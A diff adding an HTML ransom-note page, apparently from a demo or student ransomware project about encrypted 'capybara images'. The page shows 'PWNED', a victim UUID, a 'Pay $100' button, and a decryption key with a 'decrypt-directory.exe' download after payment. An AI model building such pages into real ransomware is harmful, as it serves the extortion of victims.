@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" type="text/css" href="CSS/styles.css">
+    <script type="text/javascript" src="js/jquery.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
+
+</head>
+<body class = "container">
+    <h1> PWNED </h1>
+    <div class = "jumbotron">
+        If you want your capybaras back, you will have to <b>pay</b>. Click "Pay" to receive the password needed to decrypt your capybara images.
+    </div>
+    <div>
+            <div class="form-group">
+                <div class="text-center">
+                    <div class="row">
+                        <div class="col-sm-3 offset-sm-3">
+                            <h4><label for="uuid">Your UUID:</label></h4>
+                        </div>
+                        <div class="col-sm-3">
+                            <h4><code id = "uuid"></code></h4>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="form-group">
+                <div class="text-center">
+                        <form method="GET" action="">
+                            <button type="button" class="btn btn-primary btn-lg" id="pay">Pay $100</button>
+                        </form>
+                    </div>
+                    
+            </div>
+
+            <div id = "keySection" class="invisible">
+                <div class = "jumbotron">
+                    Thanks for your donation! <code>decrypt-directory.exe</code> is now downloading. Place that file in the encrypted directory to decrypt everything.
+                </div>
+                <div class="form-group">
+                    <div class="text-center">
+                        <div class="row">
+                            <div class="col-sm-3 offset-sm-3">
+                                <h4><label for="key">Your KEY:</label></h4>
+                            </div>
+                            <div class="col-sm-3">
+                                <h4><code id = "key"></code></h4>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+    </div>
+    <script type="text/javascript" src="js/index.js"></script>
+</body>
+</html
